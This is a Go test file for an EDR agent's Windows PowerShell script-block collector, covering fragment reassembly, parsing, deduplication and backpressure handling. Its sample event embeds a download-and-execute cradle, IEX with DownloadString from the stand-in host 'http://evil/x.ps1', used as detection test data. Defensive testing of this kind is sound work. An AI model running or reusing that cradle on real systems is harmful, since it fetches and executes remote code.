//go:build windows
// +build windows

package collectors

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/edr-platform/win-agent/internal/event"
	"github.com/edr-platform/win-agent/internal/logging"
)

func testLogger(t *testing.T) *logging.Logger {
	// Outside t.TempDir: Windows cannot delete the still-open log file.
	l := logging.NewLogger(logging.Config{Level: "ERROR", FilePath: filepath.Join(t.TempDir(), "collector.log")})
	t.Cleanup(func() { _ = l.Close() })
	return l
}

const sample4104 = `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell"/><EventID>4104</EventID><TimeCreated SystemTime="2026-10-08T10:15:00.1234567Z"/><Execution ProcessID="4321" ThreadID="1"/><Computer>WS-01</Computer><Security UserID="S-1-5-21-1-2-3-1001"/></System><EventData><Data Name="MessageNumber">1</Data><Data Name="MessageTotal">1</Data><Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')</Data><Data Name="ScriptBlockId">0c3d4a2e-1111-2222-3333-444455556666</Data><Data Name="Path"></Data></EventData></Event>`

func TestPowerShellFragmentReassembly(t *testing.T) {
	c := &PowerShellCollector{}
	first, complete := c.assembleScript(psChannelWindows, 42, "block", 2, 2, "Expression $x")
	if complete || first != "Expression $x" {
		t.Fatal("individual fragment must remain visible")
	}
	full, complete := c.assembleScript(psChannelWindows, 42, "block", 1, 2, "Invoke-")
	if !complete || full != "Invoke-Expression $x" {
		t.Fatalf("script spanning fragments was not reassembled: %q", full)
	}
	_, complete = c.assembleScript(psChannelCore, 42, "block", 1, 2, "Invoke-")
	if complete {
		t.Fatal("different channels must not share an assembly")
	}
	_, complete = c.assembleScript(psChannelCore, 43, "block", 2, 2, "Expression")
	if complete {
		t.Fatal("different processes must not share an assembly")
	}
}

func TestPowerShellScriptBlockParsing(t *testing.T) {
	ch := make(chan *event.Event, 4)
	c := NewPowerShellCollector(ch, testLogger(t), t.TempDir(), false)
	c.handle(psChannelWindows, sample4104)
	select {
	case e := <-ch:
		if e.Type != event.EventTypePowerShell || e.Data["action"] != "script_block" {
			t.Fatalf("unexpected event %+v", e)
		}
		if !strings.Contains(e.Data["script_block_text"].(string), "DownloadString") {
			t.Fatal("script block text missing")
		}
		if e.Data["pid"].(uint32) != 4321 || e.Data["user_sid"] != "S-1-5-21-1-2-3-1001" || e.Data["channel"] != psChannelWindows {
			t.Fatalf("system fields not mapped: %+v", e.Data)
		}
		if e.Timestamp.UTC().Format(time.RFC3339Nano) != "2026-10-08T10:15:00.1234567Z" {
			t.Fatal("replayed telemetry must retain the original event timestamp")
		}
	default:
		t.Fatal("no event emitted")
	}
	// The identical block from the same process is de-duplicated.
	c.handle(psChannelWindows, sample4104)
	if len(ch) != 0 {
		t.Fatal("duplicate block must be suppressed")
	}
}

func TestPowerShellBackpressureRetainsRecordUntilReceiverReady(t *testing.T) {
	ch := make(chan *event.Event)
	c := NewPowerShellCollector(ch, testLogger(t), t.TempDir(), false)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	done := make(chan bool, 1)
	go func() { done <- c.handleContext(ctx, psChannelWindows, sample4104) }()
	select {
	case <-done:
		t.Fatal("record dropped before a receiver became available")
	case <-time.After(2200 * time.Millisecond):
	}
	select {
	case e := <-ch:
		if e.Type != event.EventTypePowerShell {
			t.Fatal("wrong event type")
		}
	case <-ctx.Done():
		t.Fatal("record was not retained")
	}
	if !<-done {
		t.Fatal("delivered record should allow bookmark advancement")
	}
}

func TestPowerShellCancelledHandoffRemainsReplayable(t *testing.T) {
	ch := make(chan *event.Event, 1)
	ch <- &event.Event{}
	c := NewPowerShellCollector(ch, testLogger(t), t.TempDir(), false)
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if c.handleContext(ctx, psChannelWindows, sample4104) {
		t.Fatal("cancelled handoff must not advance bookmark")
	}
	<-ch
	if !c.handleContext(context.Background(), psChannelWindows, sample4104) {
		t.Fatal("replay failed")
	}
	if len(ch) != 1 {
		t.Fatal("cancelled record was incorrectly deduplicated")
	}
}

// End-to-end on a real host: PowerShell auto-logs "suspicious" script blocks
// even without the Script Block Logging policy, so a block mentioning
// GetProcAddress must arrive through the subscription. Skips when the host
// does not log it (e.g. logging disabled by GPO).
func TestPowerShellCollectorLive(t *testing.T) {
	if os.Getenv("EDR_RUN_LIVE_TESTS") != "1" {
		t.Skip("live endpoint testing requires explicit EDR_RUN_LIVE_TESTS=1")
	}
	if _, err := exec.LookPath("powershell.exe"); err != nil {
		t.Skip("powershell.exe not available")
	}
	ch := make(chan *event.Event, 256)
	c := NewPowerShellCollector(ch, testLogger(t), t.TempDir(), false)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if err := c.Start(ctx); err != nil {
		t.Skipf("subscription unavailable: %v", err)
	}
	time.Sleep(500 * time.Millisecond)
	marker := "edr-test-" + time.Now().Format("150405.000")
	_ = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command",
		"$m='"+marker+"'; $x='GetProcAddress'; Write-Output $m").Run()
	deadline := time.After(15 * time.Second)
	for {
		select {
		case e := <-ch:
			if s, _ := e.Data["script_block_text"].(string); strings.Contains(s, marker) {
				return
			}
		case <-deadline:
			t.Skip("script block was not logged by this host within 15s (logging policy)")
		}
	}
}
